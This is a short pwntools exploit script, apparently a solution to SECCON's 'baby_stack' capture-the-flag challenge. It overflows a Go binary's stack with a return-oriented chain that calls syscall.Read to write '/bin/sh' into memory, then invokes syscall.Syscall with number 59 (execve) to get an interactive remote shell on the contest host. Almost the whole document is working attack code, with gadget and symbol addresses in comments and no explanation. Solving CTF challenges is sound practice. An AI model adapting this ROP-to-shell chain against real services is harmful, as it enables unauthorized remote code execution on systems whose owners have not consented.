from pwn import *
import sys

#context.log_level = "debug"
HOST = "baby_stack.pwn.seccon.jp"
PORT = 15285
#conn = process("./baby_stack")
conn = remote(HOST, PORT)
conn.sendlineafter(">>", "B")
payload = ""
payload += p64(0x0) * ((108 - 4) // 8)
payload += p64(0x0)
payload += p64(0x0) * ((92 - 4) // 8)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0) * ((188 - 4) // 8)
#3301: 0000000000495750   192 FUNC    GLOBAL DEFAULT    1 syscall.read
#3293: 0000000000495250   128 FUNC    GLOBAL DEFAULT    1 syscall.Read
#2426: 0000000000456910    48 FUNC    GLOBAL DEFAULT    1 runtime.read
#2540: 00000000004687f0   512 FUNC    GLOBAL DEFAULT    1 os.(*File).Read
payload += p64(0x495250)
#0x004127e7           4883c410  add rsp, 0x10
#0x004127eb                 c3  ret
#0x00405127           4883c418  add rsp, 0x18
#0x0040512b                 c3  ret
#0x0040175e           4883c420  add rsp, 0x20
#0x00401762                 c3  ret
#0x00406979           4883c438  add rsp, 0x38
#0x0040697d                 c3  ret
#payload += p64(0)
#1381: 000000000059f958     8 OBJECT  GLOBAL DEFAULT    9 os.Stdin
payload += p64(0x406979)
payload += p64(0)
payload += p64(0x5a0000)
payload += p64(8)
payload += p64(0) * 4
payload += p64(0x496a30)
payload += p64(0)
payload += p64(59)
#3327: 0000000000496a30   112 FUNC    GLOBAL DEFAULT    1 syscall.Syscall
#1852: 000000000042e830   480 FUNC    GLOBAL DEFAULT    1 runtime.execute
payload += p64(0x5a0000)
payload += p64(0x5a0008)
conn.sendlineafter(">>", payload)
conn.recvuntil("msg : \n")
pause()
conn.send("/bin/sh\x00")
conn.interactive()
